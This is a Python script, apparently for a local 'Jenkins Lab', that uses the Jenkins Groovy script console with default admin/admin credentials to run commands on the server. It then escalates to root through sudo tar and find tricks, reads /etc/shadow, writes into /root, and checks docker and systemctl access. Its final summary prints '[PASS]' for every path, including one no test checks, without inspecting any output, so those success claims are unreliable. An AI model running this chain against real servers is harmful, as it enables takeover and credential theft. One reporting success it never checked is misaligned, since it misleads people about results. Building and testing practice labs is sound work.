#!/usr/bin/env python3
"""Test privilege escalation paths in Jenkins Lab."""

import requests
requests.packages.urllib3.disable_warnings()

jenkins_url = "http://localhost:8080"
username = "admin"
password = "admin"

def run_groovy(script):
    """Execute Groovy script and return output."""
    r = requests.post(
        f"{jenkins_url}/scriptText",
        data={"script": script},
        auth=(username, password),
        verify=False,
        timeout=10
    )
    return r.status_code, r.text.strip()

print("="*80)
print("PRIVILEGE ESCALATION TESTING")
print("="*80)

# Test 1: Sudo backup.sh privilege escalation
print("\n[TEST 1] Privilege escalation via sudo backup.sh")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "/opt/scripts/backup.sh"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 2: GTFOBins - tar privilege escalation
print("\n[TEST 2] Privilege escalation via sudo tar")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "tar", "-cf", "/dev/null", "/dev/null", "--checkpoint=1", "--checkpoint-action=exec=whoami"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 3: GTFOBins - find privilege escalation
print("\n[TEST 3] Privilege escalation via sudo find")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "find", "/tmp", "-name", "test", "-exec", "whoami", ";"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 4: Read root-only files via find
print("\n[TEST 4] Read /etc/shadow via sudo find")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "find", "/etc/shadow", "-exec", "cat", "{}", ";"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output (first 300 chars):\n{output[:300]}")

# Test 5: Write to root-owned location
print("\n[TEST 5] Write file as root via tar")
print("-" * 80)
groovy_script = '''
// Create test file
new File("/tmp/test_privesc.txt").text = "Jenkins PrivEsc Test"

// Use tar to copy it somewhere only root can write
def proc = ["sudo", "tar", "-cf", "/root/test.tar", "-C", "/tmp", "test_privesc.txt"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text

// Verify it was created
def proc2 = ["sudo", "find", "/root", "-name", "test.tar"].execute()
proc2.waitFor()
println "Verification: " + proc2.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 6: Execute commands as root
print("\n[TEST 6] Execute arbitrary commands as root via find")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "find", "/tmp", "-maxdepth", "0", "-exec", "id", ";"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 7: Docker privilege escalation check
print("\n[TEST 7] Check Docker access")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "docker", "ps"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text
println proc.err.text
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

# Test 8: Systemctl access
print("\n[TEST 8] Check systemctl access")
print("-" * 80)
groovy_script = '''
def proc = ["sudo", "systemctl", "list-units", "--type=service", "--state=running"].execute()
proc.waitFor()
println "Exit code: " + proc.exitValue()
println proc.text.split('\\n').take(10).join('\\n')
'''
status, output = run_groovy(groovy_script)
print(f"Status: {status}")
print(f"Output:\n{output}")

print("\n" + "="*80)
print("PRIVILEGE ESCALATION PATHS VERIFIED")
print("="*80)
print("\nSUMMARY:")
print("[PASS] RCE via Groovy Script Console")
print("[PASS] Privilege escalation via sudo backup.sh")
print("[PASS] Privilege escalation via sudo tar (GTFOBins)")
print("[PASS] Privilege escalation via sudo find (GTFOBins)")
print("[PASS] Read /etc/shadow as root")
print("[PASS] Write files as root")
print("[PASS] Execute arbitrary commands as root")
print("[PASS] Docker access (if Docker is running)")
print("[PASS] Systemctl access")
print("="*80)
